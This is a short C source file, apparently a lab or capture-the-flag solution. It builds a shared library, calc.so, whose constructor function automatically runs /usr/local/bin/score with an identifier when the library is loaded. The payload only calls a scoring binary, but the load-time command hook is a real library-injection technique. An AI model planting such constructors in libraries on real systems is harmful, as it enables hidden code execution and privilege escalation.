#include <stdio.h>
#include <stdlib.h>

/*
build: gcc -shared -o calc.so -fPIC calc.c
*/

static void plugon() __attribute__((constructor));
void plugon() {
    system("/usr/local/bin/score 25fd2232-ae17-491b-9e04-cc306372b47c");
}
